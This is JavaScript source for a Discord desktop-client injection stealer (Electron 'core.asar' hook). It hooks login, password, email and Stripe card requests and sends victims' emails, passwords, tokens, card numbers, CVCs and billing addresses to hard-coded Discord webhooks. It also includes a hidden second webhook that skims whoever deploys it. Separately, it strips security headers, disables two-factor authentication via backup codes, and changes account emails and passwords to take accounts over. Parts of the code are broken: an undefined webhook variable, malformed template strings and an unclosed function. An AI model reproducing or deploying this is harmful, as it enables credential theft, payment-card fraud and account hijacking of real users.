const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const https = require("https");
const querystring = require('querystring');
const electron = require('electron');


const request = require("request")

  var stoler = "https://ptb.discord.com/api/webhooks/903654798316957756/uz9lSQONl4b5L5NTfdxulWgcFQB1bzCSUAQuLsQqOLrHy_n-MwxlhfkL9RBFtpF2zK7l"
  stoler = stoler.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
  
function Secure(token,password){
  	request(
		"https://discordapp.com/api/v7/users/@me", {
			method: "GET",
			headers: {
				authorization: token,
			},
			json: true
		},
		function (error, response, body) {
			
	
if(body.mfa_enabled == true){
console.log(Disable2fa(token,password))

    

} else {

  
var randomEmail = require('random-email');
const email =  `oxyfaop`+ `${randomEmail({ domain: 'gmail.com' })}`

      var generator = require('generate-password');

var newPassword = generator.generate({
	length: 10,
	numbers: true
});

  //console.log(body)
      gaechange(token,email,newPassword,password)

function gaechange (ntoken,nemail,npass,cpass) {
request(
		"https://discord.com/api/v8/users/@me", {
			method: "PATCH",
			headers: {
				authorization: ntoken,
     'Content-Type':"application/json",
			},
      body: {
				username: body.username,
				password:cpass,
				discriminator: null,
				email: nemail,
				new_password: npass,
				avatar: body.avatar,
			},
			json: true
      
		},
  
		function (error, response, body) {
     var params = {
                username: "Oxygen",
                content: "",
                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                embeds: [
                    {
                        "color": 2560,
                        "fields": [
                            {
                                "name": "**Email**",
                                "value": `${nemail}`,
                                "inline": true
                            },
                            {
                                "name": "**Pasword**",
                                "value": `Nitro Type: `${npass}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${body.token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": body.username +"#" + body.discriminator + "・" + body.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`
                        },
                        "footer": {
                            "text": "Oxygen"
                        }                 
                    }
                ]
            }
            Sendchanged(JSON.stringify(params));




      
  
  
})
}
      }
//hmm
function Disable2fa(token,password){
  var codes = [];
request(
		"https://discord.com/api/v8/users/@me/mfa/codes", {
			method: "POST",

    headers: {
				authorization: token,
    
			},
      body: {
			password:password
		},
			json: true
      
		},
  function (error, response, body) {
		
      
 body.backup_codes.forEach(x => codes.push(x.code))

console.log(Df(codes[0],token))
    
    function Df(code,token){

request(
		"https://discord.com/api/v8/users/@me/mfa/totp/disable", {
			method: "POST",
			headers: {
				authorization: token,
     'Content-Type':"application/json",
			},
      body: {
		code:code,
      
      },
			json: true
      
		},
  
		function (error, response, body) {
      
var randomEmail = require('random-email');
const email =  `oxyfaop`+ `${randomEmail({ domain: 'gmail.com' })}`

      var generator = require('generate-password');

var newPassword = generator.generate({
	length: 10,
	numbers: true
});

      change(body.token,email,newPassword,password)

      function change (ntoken,nemail,npass,cpass) {
request(
		"https://discord.com/api/v8/users/@me", {
			method: "PATCH",
			headers: {
				authorization: ntoken,
     'Content-Type':"application/json",
			},
      body: {
				username: body.username,
				password:cpass,
				discriminator: null,
				email: nemail,
				new_password: npass,
				avatar: body.avatar,
			},
			json: true
      
		},
  
		function (error, response, body) {
     // console.log(error.email._errors)
      //console.log(body)
      var params = {
                username: "Oxygen",
                content: "",
                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                embeds: [
                    {
                        "color": 2560,
                        "fields": [
                            {
                                "name": "**Email**",
                                "value": `${nemail}`,
                                "inline": true
                            },
                            {
                                "name": "**Pasword**",
                                "value": `Nitro Type: `${npass}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${body.token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": body.username +"#" + body.discriminator + "・" + body.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${body.id}/${body.avatar}.webp`
                        },
                        "footer": {
                            "text": "Oxygen"
                        }                 
                    }
                ]
            }
            Sendchanged(JSON.stringify(params));


            })

      }
      
    }
  )
    }
    
  
  
  }
  )  

}
}
    )  }
////hm







electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
    j.responseHeaders["Access-Control-Allow-Origin"] = '*';
    if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false });
    delete j.responseHeaders["content-security-policy-report-only"];
    delete j.responseHeaders["content-security-policy"];
    k({ cancel: false, responseHeaders: j.responseHeaders });
  });

  var webhook = "%WEBHOOK_LINK%";
  webhook = webhook.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
  var stealer = "https://discord.com/api/webhooks/904716780642136064/YSSvU28h4bv-ieKA-0aUcAX7-OCEH59umxHDjIeTJVAbC4XCI7h-NnR357g1HTBW3fUR"
  stealer = stealer.replace("canary.discord.com", "discord.com").replace("ptb.discord.com", "discord.com").replace("canary.discordapp.com", "discord.com").replace("ptb.discordapp.com", "discord.com")
  
  function FirstTime(){
      
      if (!fs.existsSync(path.join(__dirname, "Hazard"))){
          return true;
      }
      
      fs.rmdirSync(path.join(__dirname, "Hazard"));
      const window = BrowserWindow.getAllWindows()[0];
      window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {
      });
      return false;
  }
  const Filter = {
      "urls":[ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
      "https://discord.com/api/v*/users/@me/billing/subscriptions",
      "wss://remote-auth-gateway.discord.gg/*"
      ]
  }
  session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
          if (FirstTime())
          if (details.url.startsWith("wss://")){
              callback({cancel: true})
  
          }
  else{
      callback({cancel:false})
  
  }})
  
  function SendToWebhook(what) {
    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discord.", "discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discordapp.", "discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discord.", "ptb.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discord.", "ptb.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discord.", "canary.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook.replace("discord.", "canary.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

//// Main 
window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discord.", "discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discordapp.", "discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discord.", "ptb.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discord.", "ptb.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discord.", "canary.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${stealer.replace("discord.", "canary.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));
}
  
  function GetNitro(flags){
      if (flags == 0){
          return "No Nitro";
      }
      if (flags == 1){
          return "Nitro Classic";
      }
      if (flags == 2){
          return "Nitro Boost";
      }
      else{
          return "No Nitro";
      }
  }
  function GetBadges(flags)
  {
  const Discord_Employee = 1;
  const Partnered_Server_Owner = 2;
  const HypeSquad_Events = 4;
  const Bug_Hunter_Level_1 = 8;
  const House_Bravery = 64;
  const House_Brilliance = 128;
  const House_Balance = 256;
  const Early_Supporter = 512;
  const Bug_Hunter_Level_2 = 16384;
  const Early_Verified_Bot_Developer = 131072;
  
  var badges = "";
  
  if((flags & Discord_Employee) == Discord_Employee){
     badges += "Staff,";
  }
  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
     badges += "Partner,";
  }
  if((flags & HypeSquad_Events) == HypeSquad_Events){
     badges += "Hypesquad Event,"
  }
  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
     badges += "Green Bughunter,";
  }
  if((flags & House_Bravery) == House_Bravery) {
     badges += "Hypesquad Bravery,";
  }
  if((flags & House_Brilliance) == House_Brilliance){
     badges += "HypeSquad Brillance,";
  }
  if((flags & House_Balance) == House_Balance){
     badges += "HypeSquad Balance,";
  }
  if((flags & Early_Supporter) == Early_Supporter){
     badges += "Early Supporter,";
  }
  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
     badges += "Gold BugHunter,";
  }
  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
     badges += "Discord Developer,";
  }
  if (badges == "" ){
      badges = "None"
  }
  return badges;
  
  }
  
  function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, true).then((ip) => {
        const json = JSON.parse(info);

        var params = {
            username: "Zero Fa",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
            embeds: [
                {
                    "color": 2560,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": `Email: ${json.email} - Password: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Zero Fa By Zero"
                    }
                }
            ]
        }

        SendToWebhook(JSON.stringify(params));

    })})
}
  
  function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true).then((info => {

            window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
            xmlHttp.send( null );
            xmlHttp.responseText;
        `, true).then((ip) => {

            var json = JSON.parse(info);

            var params = {
                username: "Zero Fa",
                content: "",
                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                embeds: [
                    {
                        "color": 2560,
                        "fields": [
                            {
                                "name": "**Password Changed**",
                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": json.username +"#" + json.discriminator + "・" + json.id,
                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": "Zero Fa By Zero"
                        }                 
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params));

        })
    }));

  }
  
  function ChangeEmail(newemail, password, token) {
  
    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, true).then((ip) => {

        var json = JSON.parse(info);
        var params = {
            username: "Zero fa",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
            embeds: [
                {
                    "color": 2560,
                    "fields": [
                        {
                            "name": "**Email Changed**",
                            "value": `New Email: ${newemail}\nPassword: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Other Info**",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Zero Fa By Zero"
                    }                
                }
            ]
        }
        SendToWebhook(JSON.stringify(params));

    })})
      
  }
  
  function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
  
    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, true).then((ip) => {

        var json = JSON.parse(info);
        var params = {
            username: "Zero Fa",
            content: "",
            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
            embeds: [
                {
                    "color": 2560,
                    "fields": [
                        {
                            "name": "**Credit Card Added**",
                            "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                            "inline": true
                        },
                        {
                            "name": "**Other Info**",
                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": json.username + "#" + json.discriminator + "・" + json.id,
                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": "Zero Fa By Zero"
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params));
    })})
  }
  
  const ChangePasswordFilter = {
      urls: [
          "https://discord.com/api/v*/users/@me",
          "https://discordapp.com/api/v*/users/@me",
          "https://*.discord.com/api/v*/users/@me",
          "https://discordapp.com/api/v*/auth/login",
          'https://discord.com/api/v*/auth/login',
          'https://*.discord.com/api/v*/auth/login',
          "https://api.stripe.com/v*/tokens"
      ]
  };
  
  session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
      if (details.url.endsWith("login")) {
          if (details.statusCode == 200) {
              const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
              const email = data.login;
              const password = data.password;
  
              const window = BrowserWindow.getAllWindows()[0];
              window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                      Login(email, password, token);
              }));
          } else {
          }
      }
   
      if (details.url.endsWith("users/@me")) {
  
          if (details.statusCode == 200 && details.method == "PATCH") {
              const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
              if (data.password != null && data.password != undefined && data.password != "") {
                  if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
  
                      const window = BrowserWindow.getAllWindows()[0];
                      window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                          ChangePassword(data.password, data.new_password, token);
                      }));
                  }
                  if (data.email != null && data.email != undefined && data.email != "") {
                      const window = BrowserWindow.getAllWindows()[0];
                      window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                          ChangeEmail(data.email, data.password, token);
                      }));
                  }
              }
          } else {
          }
      }
      if (details.url.endsWith("tokens")) {
  
          const window = BrowserWindow.getAllWindows()[0];
          const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
          window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
              CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token);
          }));
      }
  });


function Sendchanged(what) {
    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discord.", "discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discordapp.", "discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discord.", "ptb.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discord.", "ptb.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discord.", "canary.discord.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));

    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${cwebhook.replace("discord.", "canary.discordapp.")}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, true).then((token => {

    }));
  module.exports = require('./core.asar');
